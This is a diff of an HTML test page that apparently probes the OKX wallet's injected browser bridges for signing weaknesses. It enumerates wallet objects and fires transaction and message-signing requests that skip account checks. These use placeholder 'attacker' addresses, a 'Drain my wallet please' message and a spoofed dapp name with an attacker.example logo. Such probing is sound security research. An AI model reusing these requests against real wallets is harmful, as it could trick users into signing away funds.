@@ -1,22 +1,32 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_SIGN_PROBE</title>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_SIGN_PROBE_v2</title>
 <style>
 body{font-family:monospace;font-size:12px;padding:6px;background:#fff;color:#000}
 button{padding:12px;margin:6px 0;font-size:14px;background:#0066cc;color:#fff;border:0;display:block;width:100%;border-radius:6px}
 .danger{background:#cc0000}
+.warn{background:#ff8800}
 pre{background:#eee;padding:4px;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto}
 .h{background:#ff0;padding:2px}
+h3{margin:8px 0 2px;font-size:13px}
 </style></head><body>
-<h2>OKX Wallet Signing Probe</h2>
+<h2>OKX Sign Probe v2</h2>
 <p>URL: <span class="h" id="u"></span></p>
 
-<button onclick="ethConnect()">[ETH] eth_requestAccounts (CONNECT)</button>
-<button onclick="ethGetAccounts()">[ETH] eth_accounts (read)</button>
-<button onclick="ethPersonalSign()" class="danger">[ETH] personal_sign 'phishing-test'</button>
-<button onclick="ethSendTx()" class="danger">[ETH] eth_sendTransaction (0 value to 0xdead)</button>
+<h3>0. Inspect bridges</h3>
+<button onclick="inspectBridges()" class="warn">[INSPECT] log all wallet bridges</button>
 
-<button onclick="solConnect()">[SOL] _solana_.postMessage 'connect'</button>
-<button onclick="solSignMessage()" class="danger">[SOL] _solana_.postMessage 'signMessage'</button>
+<h3>1. EVM</h3>
+<button onclick="ethConnect()">[ETH] eth_requestAccounts</button>
+<button onclick="ethSendTxRaw()" class="danger">[ETH] eth_sendTransaction RAW (no acct check)</button>
+<button onclick="ethPersonalSignRaw()" class="danger">[ETH] personal_sign RAW (no acct check, attacker addr)</button>
+
+<h3>2. Solana via okxwallet.solana.* (proper API)</h3>
+<button onclick="okxSolConnect()">[SOL] okxwallet.solana.connect()</button>
+<button onclick="okxSolSign()" class="danger">[SOL] okxwallet.solana.signMessage('phishing-test')</button>
+<button onclick="okxSolSignTx()" class="danger">[SOL] okxwallet.solana.signTransaction(fake)</button>
+
+<h3>3. Raw _solana_ bridge (control)</h3>
+<button onclick="solBridgeSign()" class="danger">[SOL] _solana_.postMessage signMessage (dappName=PHISH-TEST)</button>
 
 <pre id="out">click a button</pre>
 
@@ -25,8 +35,32 @@ document.getElementById("u").textContent = location.href;
 var out = document.getElementById("out");
 function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }
 
+function inspectBridges(){
+  try{
+    var keys = ["ethereum","okxwallet","_solana_","_aptos_","_okx_sui_","tron","okxBtcJSBridge","okxNostrJSBridge","okxTonJSBridge","okxStarkJSBridge","okxOsmosJSBridge","okxInternalJSBridge","native"];
+    keys.forEach(function(k){
+      var v = window[k];
+      log(k+": "+(v?typeof v:"MISSING"));
+    });
+    if(window.okxwallet){
+      log("okxwallet keys: "+Object.keys(window.okxwallet).join(","));
+      if(window.okxwallet.solana){
+        log("okxwallet.solana keys: "+Object.keys(window.okxwallet.solana).join(","));
+        log("okxwallet.solana.publicKey: "+(window.okxwallet.solana.publicKey?window.okxwallet.solana.publicKey.toString():"null"));
+        log("okxwallet.solana.isConnected: "+window.okxwallet.solana.isConnected);
+      }
+      if(window.okxwallet.bitcoin) log("okxwallet.bitcoin keys: "+Object.keys(window.okxwallet.bitcoin).join(","));
+    }
+    if(window.ethereum){
+      log("ethereum keys: "+Object.keys(window.ethereum).slice(0,15).join(","));
+      log("ethereum.isOkxWallet: "+window.ethereum.isOkxWallet);
+      log("ethereum.selectedAddress: "+window.ethereum.selectedAddress);
+    }
+  }catch(e){ log("INSPECT ERROR: "+e.message); }
+}
+
 async function ethConnect(){
-  log("CALLING ethereum.request({method:'eth_requestAccounts'})...");
+  log("CALLING eth_requestAccounts...");
   try{
     var p = window.ethereum || window.okxwallet;
     var r = await p.request({method:"eth_requestAccounts"});
@@ -34,59 +68,75 @@ async function ethConnect(){
   }catch(e){ log("ERROR: " + e.message); }
 }
 
-async function ethGetAccounts(){
+async function ethSendTxRaw(){
+  log("CALLING eth_sendTransaction RAW (skip acct check)...");
   try{
     var p = window.ethereum || window.okxwallet;
-    var r = await p.request({method:"eth_accounts"});
-    log("eth_accounts: " + JSON.stringify(r));
-  }catch(e){ log("ERROR: " + e.message); }
-}
-
-async function ethPersonalSign(){
-  log("CALLING personal_sign...");
-  try{
-    var p = window.ethereum || window.okxwallet;
-    var acc = await p.request({method:"eth_accounts"});
-    if(!acc || !acc.length){ log("Need to connect first"); return; }
-    var msg = "0x" + Array.from("phishing-test-do-not-sign").map(c=>c.charCodeAt(0).toString(16).padStart(2,"0")).join("");
-    var r = await p.request({method:"personal_sign", params:[msg, acc[0]]});
-    log("SIGNATURE: " + r);
-  }catch(e){ log("ERROR: " + e.message); }
-}
-
-async function ethSendTx(){
-  log("CALLING eth_sendTransaction (to 0xdead, value 0)...");
-  try{
-    var p = window.ethereum || window.okxwallet;
-    var acc = await p.request({method:"eth_accounts"});
-    if(!acc || !acc.length){ log("Need to connect first"); return; }
     var r = await p.request({method:"eth_sendTransaction", params:[{
-      from: acc[0],
+      from: "0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
       to: "0x000000000000000000000000000000000000dEaD",
-      value: "0x0",
-      gas: "0x5208"
+      value: "0xDE0B6B3A7640000",
+      gas: "0x5208",
+      data: "0x"
     }]});
     log("TX HASH: " + r);
   }catch(e){ log("ERROR: " + e.message); }
 }
 
-function solConnect(){
-  log("CALLING _solana_.postMessage 'connect'...");
+async function ethPersonalSignRaw(){
+  log("CALLING personal_sign RAW...");
   try{
-    var s = window._solana_;
-    if(!s){ log("no _solana_"); return; }
-    var msg = JSON.stringify({id:1,name:"connect",object:{},dappName:"PHISH-TEST",dappLogoUrl:"",chainId:0});
-    var r = s.postMessage(msg);
-    log("RETURNED: " + JSON.stringify(r));
+    var p = window.ethereum || window.okxwallet;
+    var msg = "0x" + Array.from("Drain my wallet please").map(c=>c.charCodeAt(0).toString(16).padStart(2,"0")).join("");
+    var r = await p.request({method:"personal_sign", params:[msg, "0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"]});
+    log("SIG: " + r);
   }catch(e){ log("ERROR: " + e.message); }
 }
 
-function solSignMessage(){
-  log("CALLING _solana_.postMessage 'signMessage'...");
+async function okxSolConnect(){
+  log("CALLING okxwallet.solana.connect()...");
+  try{
+    var ow = window.okxwallet;
+    if(!ow || !ow.solana){ log("no okxwallet.solana"); return; }
+    var r = await ow.solana.connect();
+    var pk = (r && r.publicKey) ? r.publicKey.toString() : (ow.solana.publicKey ? ow.solana.publicKey.toString() : "?");
+    log("SOL CONNECTED pubkey: " + pk);
+  }catch(e){ log("ERROR: " + e.message); }
+}
+
+async function okxSolSign(){
+  log("CALLING okxwallet.solana.signMessage()...");
+  try{
+    var ow = window.okxwallet;
+    if(!ow || !ow.solana){ log("no okxwallet.solana"); return; }
+    if(!ow.solana.isConnected && !ow.solana.publicKey){
+      log("Not connected, calling connect first...");
+      try{ await ow.solana.connect(); }catch(e){ log("auto-connect failed: "+e.message); return; }
+    }
+    var msg = new TextEncoder().encode("phishing-test-do-not-sign-this-message");
+    var r = await ow.solana.signMessage(msg, "utf8");
+    log("SOL SIG: " + JSON.stringify({signature: r.signature ? Array.from(r.signature.slice(0,8)) : r}));
+  }catch(e){ log("ERROR: " + e.message); }
+}
+
+async function okxSolSignTx(){
+  log("CALLING okxwallet.solana.signTransaction()...");
+  try{
+    var ow = window.okxwallet;
+    if(!ow || !ow.solana){ log("no okxwallet.solana"); return; }
+    // Build a minimal fake unsigned Solana legacy tx blob (will likely fail validation but should reveal prompt)
+    var fakeTx = new Uint8Array([0x01,0x00,0x00,0x00, 0x01,0x00,0x00,0x00, 0xff,0xff,0xff,0xff]);
+    var r = await ow.solana.signTransaction(fakeTx);
+    log("SOL TX SIG: " + JSON.stringify(r));
+  }catch(e){ log("ERROR: " + e.message); }
+}
+
+function solBridgeSign(){
+  log("CALLING _solana_.postMessage 'signMessage' (raw bridge)...");
   try{
     var s = window._solana_;
     if(!s){ log("no _solana_"); return; }
-    var msg = JSON.stringify({id:2,name:"signMessage",object:{message:[112,104,105,115,104,105,110,103]},dappName:"PHISH-TEST",dappLogoUrl:"",chainId:0});
+    var msg = JSON.stringify({id:99,name:"signMessage",object:{message:[112,104,105,115,104,105,110,103,45,116,101,115,116]},dappName:"PHISH-TEST-FAKE-NAME",dappLogoUrl:"https://attacker.example/fake.png",chainId:0});
     var r = s.postMessage(msg);
     log("RETURNED: " + JSON.stringify(r));
   }catch(e){ log("ERROR: " + e.message); }
